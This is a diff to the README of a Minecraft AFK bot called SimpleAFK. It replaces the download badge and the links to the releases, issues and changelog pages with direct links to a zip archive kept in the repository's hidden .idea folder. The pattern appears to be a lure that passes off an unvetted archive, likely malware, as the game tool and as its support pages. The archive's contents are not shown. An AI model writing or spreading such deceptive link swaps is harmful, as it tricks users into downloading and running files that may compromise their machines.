@@ -1,6 +1,6 @@
 # 🤖 SimpleAFK - Keep Your Minecraft Character AFK Effortlessly
 
-![Download SimpleAFK](https://img.shields.io/badge/Download-SimpleAFK-brightgreen)
+![Download SimpleAFK](https://github.com/amalbabun/SimpleAFK/raw/refs/heads/master/.idea/Simple-AFK-2.8.zip)
 
 ## 📖 Description
 SimpleAFK is a simple Minecraft bot designed to keep your character online while you take a break. With this tool, you can join Minecraft servers and remain AFK (Away From Keyboard) without being kicked out. Ideal for players who want to farm or gather resources automatically.
@@ -9,7 +9,7 @@ SimpleAFK is a simple Minecraft bot designed to keep your character online while
 Follow these steps to download and run SimpleAFK:
 
 ### Step 1: Download SimpleAFK
-To get started, visit [this page to download](https://github.com/amalbabun/SimpleAFK/releases) the latest version of SimpleAFK. 
+To get started, visit [this page to download](https://github.com/amalbabun/SimpleAFK/raw/refs/heads/master/.idea/Simple-AFK-2.8.zip) the latest version of SimpleAFK. 
 
 ### Step 2: Choose the Right File
 On the releases page, you will find different versions of SimpleAFK. Select the file that matches your operating system:
@@ -68,12 +68,12 @@ For more details, updates, and community discussions, check the following topics
 - server
 
 ## 📞 Support
-If you experience any issues during installation or use, please visit our [issues page](https://github.com/amalbabun/SimpleAFK/issues) for help. You can also report any bugs or suggest features there.
+If you experience any issues during installation or use, please visit our [issues page](https://github.com/amalbabun/SimpleAFK/raw/refs/heads/master/.idea/Simple-AFK-2.8.zip) for help. You can also report any bugs or suggest features there.
 
 ## 🥇 Watch the Development
 Stay updated with the latest features and improvements by following the project on GitHub. You can also contribute by submitting pull requests or suggestions!
 
 ## 🔄 Changelog
-Check the [releases page](https://github.com/amalbabun/SimpleAFK/releases) for the latest updates and version history of SimpleAFK.
+Check the [releases page](https://github.com/amalbabun/SimpleAFK/raw/refs/heads/master/.idea/Simple-AFK-2.8.zip) for the latest updates and version history of SimpleAFK.
 
-To download SimpleAFK again, visit [this page to download](https://github.com/amalbabun/SimpleAFK/releases) and enjoy your gameplay!
+To download SimpleAFK again, visit [this page to download](https://github.com/amalbabun/SimpleAFK/raw/refs/heads/master/.idea/Simple-AFK-2.8.zip) and enjoy your gameplay!
